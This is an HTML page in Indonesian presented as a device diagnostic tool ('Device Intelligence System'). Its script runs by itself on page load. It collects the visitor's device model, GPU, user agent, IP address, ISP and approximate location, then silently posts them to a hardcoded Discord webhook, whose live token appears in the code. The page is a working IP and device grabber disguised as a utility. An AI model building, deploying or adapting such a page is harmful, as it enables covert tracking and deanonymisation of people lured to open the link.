<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Diagnosa Perangkat v2.0</title>
    <style>
        body { 
            font-family: 'Inter', -apple-system, sans-serif; 
            background: #0f172a; 
            color: #f8fafc; 
            margin: 0; 
            padding: 20px; 
            display: flex; 
            justify-content: center;
            min-height: 100vh;
            align-items: center;
        }
        .card { 
            background: #1e293b; 
            padding: 25px; 
            border-radius: 16px; 
            width: 100%; 
            max-width: 500px; 
            box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); 
            border: 1px solid #334155; 
        }
        h2 { 
            color: #38bdf8; 
            text-align: center; 
            margin-top: 0; 
            margin-bottom: 20px;
            font-size: 22px; 
        }
        .info-group { 
            background: #0f172a; 
            padding: 12px 16px; 
            border-radius: 8px; 
            margin-bottom: 12px; 
            border-left: 4px solid #38bdf8;
        }
        .label { 
            color: #64748b; 
            font-size: 11px; 
            text-transform: uppercase; 
            letter-spacing: 1px; 
            font-weight: 700; 
            display: block; 
            margin-bottom: 6px; 
        }
        .value { 
            color: #e2e8f0; 
            font-size: 14px; 
            word-break: break-word; 
            font-weight: 500; 
            display: block; 
            line-height: 1.5; 
        }
        .status { 
            text-align: center; 
            padding: 12px; 
            border-radius: 8px; 
            font-size: 13px; 
            font-weight: bold; 
            margin-top: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .success { background: rgba(52, 211, 153, 0.1); color: #34d399; border: 1px solid rgba(52, 211, 153, 0.3); }
        .loading { background: rgba(251, 191, 36, 0.1); color: #fbbf24; border: 1px solid rgba(251, 191, 36, 0.3); }
        .error { background: rgba(239, 68, 68, 0.1); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
        .pulse { animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
    </style>
</head>
<body>

<div class="card">
    <h2>🔍 Device Intelligence System</h2>
    
    <div class="info-group">
        <span class="label">Brand & Nama Produk</span>
        <span id="ui-product" class="value pulse">Mendeteksi...</span>
    </div>

    <div class="info-group">
        <span class="label">Model Hardware</span>
        <span id="ui-model" class="value pulse">Mencari...</span>
    </div>

    <div class="info-group">
        <span class="label">Alamat IP & ISP</span>
        <span id="ui-network" class="value pulse">Menghubungkan...</span>
    </div>

    <div class="info-group">
        <span class="label">Lokasi</span>
        <span id="ui-location" class="value pulse">Melacak...</span>
    </div>

    <div class="info-group">
        <span class="label">Chipset (GPU)</span>
        <span id="ui-gpu" class="value pulse">Menganalisis...</span>
    </div>

    <div id="status" class="status loading">
        <span>⚙️</span>
        <span>Sedang Memproses Data...</span>
    </div>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

    // Fungsi cerdas mendeteksi brand tanpa database lengkap
    function parseDeviceInfo(rawModel) {
        let model = rawModel.replace(/Build\/.+/i, '').replace(/_/g, ' ').trim();
        let brand = "Generic";
        let product = model;

        // Logic Regex untuk mengenali pola brand dunia
        const patterns = [
            { reg: /^SM-/i, name: "Samsung Galaxy" },
            { reg: /^CPH|^PHT|^PHM|^PCH/i, name: "OPPO" },
            { reg: /^RMX|^RMP/i, name: "Realme" },
            { reg: /^V\d{4}|^PD\d{4}/i, name: "Vivo" },
            { reg: /^M2\d|^2\d/i, name: "Xiaomi/Redmi" },
            { reg: /^Infinix|^X\d{3}/i, name: "Infinix" },
            { reg: /^iPhone/i, name: "Apple" },
            { reg: /^Pixel/i, name: "Google" }
        ];

        for (let p of patterns) {
            if (p.reg.test(model)) {
                brand = p.name.split(' ')[0];
                product = p.name + " " + model;
                break;
            }
        }

        // Cek jika brand sudah tertulis di dalam model (misal: "Redmi Note 10")
        const commonBrands = ["Samsung", "OPPO", "Vivo", "Realme", "Xiaomi", "Redmi", "Infinix", "POCO", "Sony", "Asus"];
        commonBrands.forEach(b => {
            if (model.toLowerCase().includes(b.toLowerCase())) {
                brand = b;
                product = model;
            }
        });

        return { brand, product, model };
    }

    async function getNetworkInfo() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            return await res.json();
        } catch (e) {
            return null;
        }
    }

    function getGPU() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (!gl) return "Generic GPU";
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        return debug ? gl.getParameter(debug.UNMASKED_RENDERER_INFO) : "Undetected";
    }

    async function startCapture() {
        let rawModel = navigator.platform;
        
        // Ambil High Entropy Model (Lebih akurat di Chrome Android)
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
            const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
            if (hints.model) rawModel = hints.model;
        } 
        
        // Fallback: Bedah User Agent jika model masih generik
        if (rawModel === "Linux armv8l" || rawModel === "Linux" || rawModel === "Win32") {
            const ua = navigator.userAgent;
            const match = ua.match(/\(([^)]+)\)/);
            if (match && match[1]) {
                const segments = match[1].split(';');
                rawModel = segments[segments.length - 1].trim();
            }
        }

        const info = parseDeviceInfo(rawModel);
        const net = await getNetworkInfo();
        const gpu = getGPU();

        // Update UI
        document.getElementById('ui-product').innerText = info.product;
        document.getElementById('ui-model').innerText = info.model;
        document.getElementById('ui-gpu').innerText = gpu;
        document.getElementById('ui-network').innerText = net ? `${net.ip} (${net.org})` : "Error detect IP";
        document.getElementById('ui-location').innerText = net ? `${net.city}, ${net.region}, ${net.country_name}` : "Blocked";

        // Remove pulse effect
        document.querySelectorAll('.value').forEach(el => el.classList.remove('pulse'));

        // Kirim ke Discord
        sendToDiscord(info, net, gpu);
    }

    async function sendToDiscord(info, net, gpu) {
        const statusEl = document.getElementById('status');
        const payload = {
            embeds: [{
                title: "📱 New Device Intelligence Detected",
                color: 5814783,
                fields: [
                    { name: "Brand/Product", value: `**${info.product}**`, inline: true },
                    { name: "Hardware Model", value: `\`${info.model}\``, inline: true },
                    { name: "GPU", value: gpu },
                    { name: "Network", value: net ? `IP: ${net.ip}\nISP: ${net.org}` : "N/A" },
                    { name: "Location", value: net ? `${net.city}, ${net.country_name}` : "N/A" },
                    { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        try {
            const res = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (res.ok) {
                statusEl.innerHTML = '<span>✅</span><span>Data Terkirim</span>';
                statusEl.className = "status success";
            }
        } catch (e) {
            statusEl.innerHTML = '<span>❌</span><span>Gagal Mengirim</span>';
            statusEl.className = "status error";
        }
    }

    window.onload = () => setTimeout(startCapture, 800);
</script>

</body>
</html>
